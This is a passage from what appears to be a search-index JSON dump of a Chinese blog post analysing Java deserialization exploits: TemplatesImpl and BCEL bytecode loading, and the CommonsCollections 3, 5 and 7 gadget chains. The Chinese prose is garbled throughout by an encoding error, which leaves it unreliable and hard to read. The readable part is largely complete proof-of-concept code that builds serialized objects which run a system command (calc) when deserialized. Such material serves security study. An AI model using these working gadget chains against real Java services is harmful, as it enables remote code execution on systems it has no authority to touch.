æ‰èƒ½è¢«æ‰§è¡Œã€‚è€Œä¸”ï¼Œå³ä½¿æˆ‘ä»¬å°†åˆå§‹åŒ–ä»£ç æ”¾åœ¨ç±»çš„ static å—ä¸­ï¼Œåœ¨ defineClass æ—¶ä¹Ÿæ— æ³•è¢«ç›´æ¥è°ƒç”¨åˆ°ã€‚æ‰€ä»¥ï¼Œå¦‚æœè¦ä½¿ç”¨ defineClass åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œéœ€è¦æƒ³åŠæ³•è°ƒç”¨æ„é€ å‡½æ•°ã€‚ åœ¨å®é™…åœºæ™¯ä¸­ï¼Œå› ä¸º defineClass æ–¹æ³•ä½œç”¨åŸŸæ˜¯ä¸å¼€æ”¾çš„ï¼Œæ‰€ä»¥æ”»å‡»è€…å¾ˆå°‘èƒ½ç›´æ¥åˆ©ç”¨åˆ°å®ƒï¼Œä½†å®ƒå´æ˜¯å¸¸ç”¨çš„ä¸€ä¸ªæ”»å‡»é“¾ TemplatesImpl çš„åŸºçŸ³ã€‚ ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:1:3","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.4 åˆ©ç”¨ TemplatesImpl åŠ è½½å­—èŠ‚ç  å‰é¢æåˆ°è¿‡ï¼Œå¼€å‘è€…ä¸ä¼šç›´æ¥ä½¿ç”¨åˆ° defineClass æ–¹æ³•ï¼Œä½†æ˜¯ï¼ŒJava åº•å±‚è¿˜æ˜¯æœ‰ä¸€äº›ç±»ç”¨åˆ°äº†å®ƒï¼Œå¦‚ï¼šTemplatesImplã€‚ com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl è¿™ä¸ªç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªå†…éƒ¨ç±» TransletClassLoader ï¼Œè¿™ä¸ªç±»é‡Œé‡å†™äº† defineClass æ–¹æ³•ï¼Œå¹¶ä¸”è¿™é‡Œæ²¡æœ‰æ˜¾å¼åœ°å£°æ˜å…¶å®šä¹‰åŸŸã€‚Java ä¸­é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœä¸€ä¸ªæ–¹æ³•æ²¡æœ‰æ˜¾å¼å£°æ˜ä½œç”¨åŸŸï¼Œå…¶ä½œç”¨åŸŸä¸º defaultã€‚å› æ­¤ï¼Œè¿™é‡Œè¢«é‡å†™çš„ defineClass ç”±å…¶çˆ¶ç±»çš„ protected ç±»å‹å˜æˆäº†ä¸€ä¸ª default ç±»å‹çš„æ–¹æ³•ï¼Œå¯ä»¥è¢«ç±»å¤–éƒ¨è°ƒç”¨ã€‚ ä» TransletClassLoader#defineClass() å‘å‰è¿½æº¯ä¸€ä¸‹è°ƒç”¨é“¾ï¼š TemplatesImpl#getOutputProperties() -\u003e TemplatesImpl#newTransformer() -\u003e TemplatesImpl#getTransletInstance() -\u003e TemplatesImpl#defineTransletClasses() -\u003e TransletClassLoader#defineClass() è¿½åˆ°æœ€å‰é¢ä¸¤ä¸ªæ–¹æ³• TemplatesImpl#getOutputProperties() ã€ TemplatesImpl#newTransformer() ï¼Œè¿™ä¸¤è€…çš„ä½œç”¨åŸŸæ˜¯ publicï¼Œå¯ä»¥è¢«å¤–éƒ¨è°ƒç”¨ã€‚å°è¯•ç”¨ newTransformer() æ„é€ ä¸€ä¸ªç®€å•çš„ POCï¼š public static void main(String[] args) throws Exception { String code = \"...\"; byte[] byteCode = Base64.getDecoder().decode(code); TemplatesImpl obj = new TemplatesImpl(); // _bytecodes æ˜¯ç”±å­—èŠ‚ç ç»„æˆçš„æ•°ç»„ Class c = TemplatesImpl.class; Field _bytecodes = c.getDeclaredField(\"_bytecodes\"); _bytecodes.setAccessible(true); _bytecodes.set(obj, new byte[][]{byteCode}); // _name å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ä¸²ï¼Œåªè¦ä¸ä¸º null å³å¯ Field _name = c.getDeclaredField(\"_name\"); _name.setAccessible(true); _name.set(obj, \"HelloTemplatesImpl\"); // å›ºå®šå†™æ³• Field _tfactory = c.getDeclaredField(\"_tfactory\"); _tfactory.setAccessible(true); _tfactory.set(obj, new TransformerFactoryImpl()); obj.newTransformer(); } ä½†æ˜¯ï¼ŒTemplatesImpl ä¸­å¯¹åŠ è½½çš„å­—èŠ‚ç æ˜¯æœ‰ä¸€å®šè¦æ±‚çš„ï¼šè¿™ä¸ªå­—èŠ‚ç å¯¹åº”çš„ç±»å¿…é¡»æ˜¯ com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet çš„å­ç±»ã€‚éœ€è¦æ„é€ ä¸€ä¸ªç‰¹æ®Šçš„ç±»ï¼š public class HelloTemppaltesImpl extends AbstractTranslet { @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {} @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {} public HelloTemppaltesImpl() { super(); System.out.println(\"Hello TemplatesImpl\"); } } åœ¨å¤šä¸ª Java ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œä»¥åŠ fastjsonã€jackson çš„æ¼æ´ä¸­ï¼Œéƒ½æ›¾å‡ºç°è¿‡ TemplatesImpl çš„èº«å½±ã€‚ ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:1:4","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.5 åˆ©ç”¨ BCEL ClassLoader åŠ è½½å­—èŠ‚ç  BCEL çš„å…¨åä¸º Apache Commons BCELï¼Œå±äº Apache Commons é¡¹ç›®ä¸‹çš„ä¸€ä¸ªå­é¡¹ç›®ï¼Œä½†å…¶å› ä¸ºè¢« Apache Xalan æ‰€ä½¿ç”¨ï¼Œè€Œ Apache Xalan åˆæ˜¯ Java å†…éƒ¨å¯¹äº JAXP çš„å®ç°ï¼Œæ‰€ä»¥ BCEL ä¹Ÿè¢«åŒ…å«åœ¨äº† JDK çš„åŸç”Ÿåº“ä¸­ã€‚ é€šè¿‡ BCEL æä¾›çš„ä¸¤ä¸ªç±» Repository å’Œ Utility æ¥åˆ©ç”¨ï¼šç”¨äºå°†ä¸€ä¸ª Java Class å…ˆè½¬æ¢æˆåŸç”Ÿå­—èŠ‚ç ï¼Œå½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ javac å‘½ä»¤æ¥ç¼–è¯‘ java æ–‡ä»¶ç”Ÿæˆå­—èŠ‚ç ï¼›Utility ç”¨äºå°†åŸç”Ÿçš„å­—èŠ‚ç è½¬æ¢æˆ BCEL æ ¼å¼çš„å­—èŠ‚ç ï¼š import com.sun.org.apache.bcel.internal.Repository; import com.sun.org.apache.bcel.internal.classfile.Utility; import com.sun.org.apache.bcel.internal.classfile.JavaClass; public class BCELdemo { public static void main(String[] args) throws Exception { JavaClass cls = Repository.lookupClass(evil.Hello.class); String code = Utility.encode(cls.getBytes(), true); System.out.println(code); } } è€Œ BCEL ClassLoader ç”¨äºåŠ è½½è¿™ä¸²ç‰¹æ®Šçš„ bytecodeï¼Œå¹¶å¯ä»¥æ‰§è¡Œå…¶ä¸­çš„ä»£ç : ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:1:5","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2 CommonsCollections 3 Gadget åˆ†æ åœ¨ CC1 ä¸­ï¼Œåˆ©ç”¨ TransformedMap æ¥æ‰§è¡Œä»»æ„æ–¹æ³•ï¼Œä¸Šä¸€èŠ‚ä¸­æåˆ°è¿‡ï¼Œåˆ©ç”¨ TemplatesImpl æ‰§è¡Œå­—èŠ‚ç ï¼Œå¯ä»¥å°†ä¸¤è€…åˆå¹¶ï¼Œæ„é€ å‡ºå¦‚ä¸‹ POCï¼š package com.geekby.cc3test; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.Map; public class Main { public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\"HelloTemppaltesImpl.class\")); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][] {code}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); Transformer[] transformers = new Transformer[] { new ConstantTransformer(obj), new InvokerTransformer(\"newTransformer\", null, null) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\"test\", \"poc\"); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } ä½†æ˜¯ï¼Œåœ¨ ysoserial ä¸­çš„ CC3 ä¸­ï¼Œå¹¶æ²¡æœ‰ç”¨åˆ° InvokerTransformerã€‚ SerialKiller æ˜¯ä¸€ä¸ª Java ååºåˆ—åŒ–è¿‡æ»¤å™¨ï¼Œå¯ä»¥é€šè¿‡é»‘åå•ä¸ç™½åå•çš„æ–¹å¼æ¥é™åˆ¶ååºåˆ—åŒ–æ—¶å…è®¸é€šè¿‡çš„ç±»ã€‚åœ¨å…¶å‘å¸ƒçš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬ä»£ç ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å…¶ç»™å‡ºäº†æœ€åˆçš„é»‘åå•ï¼š è¿™ä¸ªé»‘åå•ä¸­ InvokerTransformer èµ«ç„¶åœ¨åˆ—ï¼Œä¹Ÿå°±åˆ‡æ–­äº† CommonsCollections1 çš„åˆ©ç”¨é“¾ã€‚ysoserial éšåå¢åŠ äº†æ–°çš„ Gadgetsï¼Œå…¶ä¸­å°±åŒ…æ‹¬ CommonsCollections3ã€‚ CommonsCollections3 çš„ç›®çš„å¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯ä¸ºäº†ç»•è¿‡ä¸€äº›è§„åˆ™å¯¹ InvokerTransformer çš„é™åˆ¶ã€‚CommonsCollections3 å¹¶æ²¡æœ‰ä½¿ç”¨åˆ° InvokerTransformer æ¥è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œè€Œæ˜¯ç”¨åˆ°äº†å¦ä¸€ä¸ªç±»ï¼Œcom.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilterã€‚ è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•ä¸­è°ƒç”¨äº† (TransformerImpl) templates.newTransformer() ï¼Œå…å»äº†ä½¿ç”¨ InvokerTransformer æ‰‹å·¥è°ƒç”¨ newTransformer() æ–¹æ³•è¿™ä¸€æ­¥: å½“ç„¶ï¼Œç¼ºå°‘äº† InvokerTransformerï¼ŒTrAXFilter çš„æ„é€ æ–¹æ³•ä¹Ÿæ˜¯æ— æ³•è°ƒç”¨çš„ã€‚é€šè¿‡åˆ©ç”¨ org.apache.commons.collections.functors.InstantiateTransformer ä¸­çš„ InstantiateTransformer è°ƒç”¨æ„é€ æ–¹æ³•ã€‚ æ‰€ä»¥ï¼Œæœ€ç»ˆçš„ç›®æ ‡æ˜¯ï¼Œåˆ©ç”¨ InstantiateTransformer æ¥è°ƒç”¨åˆ° TrAXFilter çš„æ„é€ æ–¹æ³•ï¼Œå†åˆ©ç”¨å…¶æ„é€ æ–¹æ³•é‡Œçš„ templates.newTransformer() è°ƒç”¨åˆ° TemplatesImpl é‡Œçš„å­—èŠ‚ç ã€‚ æ„é€ çš„ Transformer è°ƒç”¨é“¾å¦‚ä¸‹ï¼š Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[] { Templates.class }, new Object[] { obj }) }; æœ€ç»ˆä¹Ÿæ˜¯å¯ä»¥æˆåŠŸè§¦å‘çš„ï¼š è­¦å‘Š è¿™ä¸ª POC å’Œ CC1 ä¹Ÿæœ‰åŒæ ·çš„é—®é¢˜ï¼Œå°±æ˜¯åªæ”¯æŒ Java 8u71 åŠä»¥ä¸‹ç‰ˆæœ¬ã€‚ å®Œæ•´çš„ååºåˆ—åŒ–è¿‡ç¨‹å¦‚ä¸‹ï¼š package com.geekby.cc3test; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import javax.xml.transform.Templates; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.Map; public class CC3Original { public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\"/Volumes/MacOS/WorkSpace/JAVA/ClassLoaderVuln/http/HelloTemppaltesImpl.class\")); TemplatesImpl obj = new TemplatesImpl()","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:2:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3 CommonsCollections 5 Gadget åˆ†æ CC5 çš„è°ƒç”¨é“¾ï¼š -\u003eBadAttributeValueExpException.readObject() -\u003eTiedMapEntry.toString() -\u003eTiedMapEntry.getValue() -\u003eLazyMap.get() -\u003eChainedTransformer.transform() -\u003eConstantTransformer.transform() -\u003eInvokerTransformer.transform() -\u003eâ€¦â€¦â€¦â€¦ è¿™é‡Œåˆå›åˆ°äº†å»è§¦å‘ LazyMap.get()ï¼Œåªä¸è¿‡æ”¹å˜äº† LazyMap.get() çš„è§¦å‘æ–¹å¼ï¼Œä¸å†å€ŸåŠ© AnnotationInvocationHandler çš„ååºåˆ—åŒ–è§¦å‘ã€‚ åœ¨ TiedMapEntry ç±»ä¸­ï¼š public class TiedMapEntry implements Entry, KeyValue, Serializable { private static final long serialVersionUID = -8453869361373831205L; private final Map map; private final Object key; //æ„é€ å‡½æ•°ï¼Œæ˜¾ç„¶æˆ‘ä»¬å¯ä»¥æ§åˆ¶ this.map ä¸º LazyMap public TiedMapEntry(Map map, Object key) { this.map = map; this.key = key; } //toStringå‡½æ•°ï¼Œæ³¨æ„è¿™é‡Œè°ƒç”¨äº† getValue() public String toString() { return this.getKey() + \"=\" + this.getValue(); } //è·Ÿè¿› getValue(), è¿™æ˜¯å…³é”®ç‚¹ this.map.get() è§¦å‘ LazyMap.get() public Object getValue() { return this.map.get(this.key); } } ç»¼ä¸Šï¼Œé€šè¿‡ TiedMapEntry.toString() å¯è§¦å‘ LazyMap.get() é€šè¿‡äº¤å‰å¼•ç”¨æœç´¢ï¼Œæ˜¯å¦å­˜åœ¨ä¸€ä¸ªç±»å¯ä»¥åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­è§¦å‘ TiedMapEntry.toString()ï¼Œæœ€ç»ˆæ‰¾åˆ°äº† BadAttributeValueExpExceptionï¼š public class BadAttributeValueExpException extends Exception { private Object val; //è¿™é‡Œå¯ä»¥æ§åˆ¶ val ä¸º TiedMapEntry private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(\"val\", null); if (valObj == null) { val = null; } else if (valObj instanceof String) { val= valObj; } else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) { val = valObj.toString(); //è¿™é‡Œæ˜¯å…³é”®ç‚¹ï¼Œè°ƒç”¨toString() } else { val = System.identityHashCode(valObj) + \"@\" + valObj.getClass().getName(); } } } æœ€ç»ˆå®ç°ä»£ç ï¼š import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonsCollections5 { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { //Transformeræ•°ç»„ Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}) }; //ChainedTransformerå®ä¾‹ Transformer chainedTransformer = new ChainedTransformer(transformers); //LazyMapå®ä¾‹ Map uselessMap = new HashMap(); Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer); //TiedMapEntry å®ä¾‹ TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,\"test\"); //BadAttributeValueExpException å®ä¾‹ BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); //åå°„è®¾ç½® val Field val = BadAttributeValueExpException.class.getDeclaredField(\"val\"); val.setAccessible(true); val.set(badAttributeValueExpException, tiedMapEntry); //åºåˆ—åŒ– ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(badAttributeValueExpException); oos.flush(); oos.close(); //æµ‹è¯•ååºåˆ—åŒ– ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } } ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:3:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4 CommonsCollections 7 Gadget åˆ†æ cc7 è°ƒç”¨é“¾ï¼š //è¿™é‡Œæ˜¯ jdk 1.7 çš„ï¼Œä¸åŒç‰ˆæœ¬ HashMap readObject å¯èƒ½ç•¥æœ‰ä¸åŒ -\u003eHashtable.readObject() -\u003eHashtable.reconstitutionPut() -\u003eAbstractMapDecorator.equals -\u003eAbstractMap.equals() -\u003eLazyMap.get() -\u003eChainedTransformer.transform() -\u003eConstantTransformer.transform() -\u003eInvokerTransformer.transform() -\u003eâ€¦â€¦â€¦â€¦ LazyMap ä¹‹åçš„åˆ©ç”¨é“¾ä¹Ÿå’Œ CC1 ç›¸åŒï¼Œå‰é¢ç”¨äº†æ–°çš„é“¾è¿›è¡Œè§¦å‘ã€‚è¿™é‡Œä»ç„¶æ˜¯æƒ³åŠæ³•è§¦å‘ LazyMap.get()ã€‚åœ¨ Hashtable çš„ readObject ä¸­ï¼Œé‡åˆ° hash ç¢°æ’æ—¶ï¼Œé€šè¿‡è°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„ equals æ–¹æ³•å¯¹æ¯”ä¸¤ä¸ªå¯¹è±¡ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºçœŸçš„ hash ç¢°æ’ã€‚è¿™é‡Œçš„ equals æ–¹æ³•æ˜¯ AbstractMap çš„ equals æ–¹æ³•ã€‚ ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:4:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4.1 AbstractMap ç”±äº LazyMap æ²¡æœ‰å®ç° equals æ–¹æ³•ï¼Œæ‰€ä»¥è°ƒç”¨å…¶ equals æ–¹æ³•å³è°ƒç”¨å…¶çˆ¶ç±» AbstractMapDecorator çš„ equals æ–¹æ³•ï¼š public boolean equals(Object object) { if (object == this) { return true; } return map.equals(object); } å³è°ƒç”¨å…¶æ‰€åŒ…è£…çš„ map çš„ equals æ–¹æ³•ã€‚ å¦‚æœè¿™é‡ŒåŒ…è£…çš„æ˜¯ HashMap è€Œå…¶æ²¡æœ‰å®ç° equals æ–¹æ³•ï¼Œå°±ä¼šè°ƒç”¨å…¶çˆ¶ç±» AbstractMap çš„ equalsæ–¹æ³•ï¼š public boolean equals(Object o) { ... Map\u003cK,V\u003e m = (Map\u003cK,V\u003e) o; ... if (value == null) { if (!(m.get(key)==null \u0026\u0026 m.containsKey(key))) return false; } else { if (!value.equals(m.get(key))) return false; } ... } æ­¤å¤„è°ƒç”¨äº†å‚æ•°çš„ get æ–¹æ³•ï¼Œå¯ä»¥æ­¤è§¦å‘ LazyMap.get ä»è€Œå®Œæˆåˆ©ç”¨ã€‚ ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:4:1","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4.2 Hashtable è¿™é‡Œä½¿ç”¨ Hashtable æ¥å……å½“ååºåˆ—åŒ–é“¾çš„è§¦å‘ç‚¹ï¼Œå…¶ååºåˆ—åŒ–è¿‡ç¨‹ä¸­è°ƒç”¨äº†è‡ªèº«çš„ reconstitutionPut æ–¹æ³•ï¼ŒHashtable ç±»çš„å…³é”®ä»£ç å¦‚ä¸‹ï¼š //Hashtable çš„ readObject æ–¹æ³• private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { â€¦â€¦â€¦â€¦â€¦â€¦ for (; elements \u003e 0; elements--) { K key = (K)s.readObject(); V value = (V)s.readObject(); //reconstitutionPutæ–¹æ³• reconstitutionPut(newTable, key, value); } this.table = newTable; } //è·Ÿè¿› reconstitutionPut æ–¹æ³• private void reconstitutionPut(Entry\u003cK,V\u003e[] tab, K key, V value) throws StreamCorruptedException { ... int hash = hash(key); int index = (hash \u0026 0x7FFFFFFF) % tab.length; for (Entry\u003cK,V\u003e e = tab[index] ; e != null ; e = e.next) { if ((e.hash == hash) \u0026\u0026 e.key.equals(key)) { throw new java.io.StreamCorruptedException(); } } Entry\u003cK,V\u003e e = tab[index]; tab[index] = new Entry\u003c\u003e(hash, key, value, e); count++; } è€Œè¿™é‡Œæƒ³è¦è§¦å‘ equals æ–¹æ³•éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š tab[index] != nullï¼šå³ç›¸åŒçš„ index åº”å‡ºç°ä¸¤æ¬¡ e.hash == hashï¼šå³ä¸¤ä¸ªç›¸åŒçš„ index å¯¹åº”çš„ Entry çš„é”®å¯¹åº”çš„ hash ç›¸åŒ è¿™é‡Œä¼šå‘ç° hash ç›¸åŒåˆ™ index ä¸€å®šç›¸åŒï¼Œæ‰€ä»¥å¯èƒ½ä¼šè®¤ä¸ºåªè¦è®¾ç½®ä¸¤ä¸ªç›¸åŒçš„ key ä½¿å¾— hash ç›¸åŒå³å¯ã€‚ ç›¸åŒçš„ key ç¡®å®å¯ä»¥è§¦å‘ equalsï¼Œä½†æ˜¯å›åˆ°ä¸€å¼€å§‹çš„ LazyMap.get çš„è§¦å‘æ¡ä»¶ï¼Œget éœ€è¦æ¥æ”¶ä¸€ä¸ªä¸å­˜åœ¨çš„ key æ‰å¯ä»¥è§¦å‘ transformï¼Œæ‰€ä»¥éœ€è¦æ‰¾åˆ°ä¸¤ä¸ªå€¼ä¸ç›¸ç­‰ä½† hash ç›¸ç­‰çš„å˜é‡ã€‚ è¿™é‡Œ ysoserial ç”¨äº†å­—ç¬¦ä¸²ï¼ŒæŸ¥çœ‹ String.hashCode ï¼š public int hashCode() { int h = hash; if (h == 0 \u0026\u0026 value.length \u003e 0) { char val[] = value; for (int i = 0; i \u003c value.length; i++) { h = 31 * h + val[i]; } hash = h; } return h; } è¿™é‡Œåªéœ€è¦æ‰¾åˆ°å››ä¸ªå­—ç¬¦åˆ†æˆä¸¤ä¸ªä¸åŒçš„ç»„(ABã€CD)ï¼Œä½¿å¾— 31 * A + B == 31 * C + D å³å¯ã€‚ysoserial ä¸­ä½¿ç”¨äº† yy å’Œ zZï¼Œä½†è¿™é‡Œè¿˜å­˜åœ¨å¾ˆå¤šç§å¯èƒ½ã€‚ ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:4:2","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4.3 POC import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class CommonsCollections7 { public static void main(String[] args) throws IllegalAccessException, IOException, ClassNotFoundException, NoSuchFieldException { Transformer[] fakeTransformer = new Transformer[]{}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}) }; //ChainedTransformerå®ä¾‹ //å…ˆè®¾ç½®å‡çš„ Transformer æ•°ç»„ï¼Œé˜²æ­¢ç”Ÿæˆæ—¶æ‰§è¡Œå‘½ä»¤ Transformer chainedTransformer = new ChainedTransformer(fakeTransformer); //LazyMapå®ä¾‹ Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); Map lazyMap1 = LazyMap.decorate(innerMap1,chainedTransformer); lazyMap1.put(\"yy\", 1); Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer); lazyMap2.put(\"zZ\", 1); Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, \"test\"); hashtable.put(lazyMap2, \"test\"); //é€šè¿‡åå°„è®¾ç½®çœŸçš„ ransformer æ•°ç»„ Field field = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); field.setAccessible(true); field.set(chainedTransformer, transformers); //ä¸Šé¢çš„ hashtable.put ä¼šä½¿å¾— lazyMap2 å¢åŠ ä¸€ä¸ª yy=\u003eyyï¼Œæ‰€ä»¥è¿™é‡Œè¦ç§»é™¤ lazyMap2.remove(\"yy\"); //åºåˆ—åŒ– ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(hashtable); oos.flush(); oos.close(); //æµ‹è¯•ååºåˆ—åŒ– ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } } ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:4:3","tags":["ä»£ç 